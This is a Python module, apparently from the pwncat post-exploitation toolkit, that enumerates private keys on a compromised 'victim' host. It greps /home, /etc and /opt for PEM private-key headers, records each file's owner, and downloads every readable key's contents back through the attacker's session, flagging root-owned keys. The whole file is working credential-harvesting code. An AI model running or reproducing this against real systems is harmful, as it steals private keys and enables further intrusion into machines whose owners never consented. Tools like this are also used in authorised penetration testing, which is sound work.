#!/usr/bin/env python3
import dataclasses
from typing import Generator

from colorama import Fore

import pwncat
from pwncat import util

name = "pwncat.enumerate.private_key"
provides = "private_key"
per_user = True


@dataclasses.dataclass
class PrivateKeyFact:
    """
    An enumeration fact we may collect at some point
    """

    uid: int
    """ The user we believe the private key belongs to """
    path: str
    """ The path to the private key on the remote host """
    content: str
    """ The actual content of the private key """

    def __str__(self):
        if self.uid == 0:
            color = Fore.RED
        else:
            color = Fore.GREEN
        return f"Potential private key for {color}{self.user.name}{Fore.RESET} at {Fore.CYAN}{self.path}{Fore.RESET}"

    @property
    def description(self) -> str:
        return self.content

    @property
    def user(self):
        return pwncat.victim.find_user_by_id(self.uid)


def enumerate() -> Generator[PrivateKeyFact, None, None]:

    data = []

    util.progress("enumerating private keys")

    # Search for private keys in common locations
    with pwncat.victim.subprocess(
        "grep -l -I -D skip -rE '^-+BEGIN .* PRIVATE KEY-+$' /home /etc /opt 2>/dev/null | xargs stat -c '%u %n' 2>/dev/null"
    ) as pipe:
        for line in pipe:
            line = line.strip().decode("utf-8").split(" ")
            uid, path = int(line[0]), " ".join(line[1:])
            util.progress(f"enumerating private keys: {Fore.CYAN}{path}{Fore.RESET}")
            data.append(PrivateKeyFact(uid, path, None))

    for fact in data:
        try:
            util.progress(
                f"enumerating private keys: downloading {Fore.CYAN}{fact.path}{Fore.RESET}"
            )
            with pwncat.victim.open(fact.path, "r") as filp:
                fact.content = filp.read().strip().replace("\r\n", "\n")
            yield fact
        except (PermissionError, FileNotFoundError):
            continue
